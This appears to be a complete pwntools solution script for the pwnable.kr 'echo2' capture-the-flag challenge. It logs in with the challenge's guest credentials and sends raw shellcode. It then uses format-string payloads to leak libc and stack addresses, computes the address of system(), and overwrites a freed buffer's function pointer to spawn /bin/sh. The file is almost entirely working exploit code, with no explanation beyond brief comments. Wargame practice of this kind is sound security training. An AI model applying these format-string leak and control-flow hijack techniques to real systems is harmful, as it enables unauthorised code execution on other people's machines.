from pwn import *
import os
import re

ssh_connection = ssh(user="echo2", host='pwnable.kr', port=2222, password="guest")
io = ssh_connection.remote('localhost', 9011)

shellcode = b"\x48\xC7\xC0\x08\x10\x60\x00\x48\xC7\x80\x00\x10\x00\x00\x28\x08\x40\x00\xC3\n"
io.sendafter(b": ", shellcode)

puts_offset = 0x080e50
system_offset = 0x050d70

io.sendafter(b"> ", b"2\n")
payload = b"%p%p%p%p%p%p%p%p%saaaaaa\x08\x20\x60\x00\x00\x00\x00\n" # should end with a null byte

io.recvuntil(b'\n')
io.send(payload)

answer = io.recvuntil(b'goodbye')
puts_address = re.findall(b"7325[^a]*aaa", answer)[0]
puts_address = puts_address[4:len(puts_address)-3]
puts_address = puts_address[::-1].hex()
puts_address = int(puts_address, 16)
libc_base = puts_address - puts_offset
system_address = libc_base + system_offset
print("system address is:", hex(system_address))

io.sendafter(b"> ", b'2\n')
payload = b'%p%p%p%p%p%p%p%p%p aa %p aaaaaa\n'
io.send(payload)
answer = io.recvuntil(b'goodbye')
main_buffer = re.findall(b"a .* a", answer)[0]
main_buffer = main_buffer[2:len(main_buffer) - 2]
main_buffer = int(main_buffer, 16)
main_buffer = main_buffer - 0x20
print("main buffer is:", hex(main_buffer))


io.sendafter(b"> ", b'4\n')
io.sendafter(b"(y/n)", b'n\n')

io.sendafter(b"> ", b"3\n")
payload = b'\0'*24 + p64(main_buffer)
payload = payload[0:len(payload) - 1] + b"\n" # add newline at the end (thisll be replaced by null byte so it's fine)
io.send(payload)
io.sendafter(b"> ", b"3\n")
payload = b'/bin/sh\0' + b'\0'*16 + p64(system_address) + b'\n'
io.send(payload)
io.interactive()



io.close()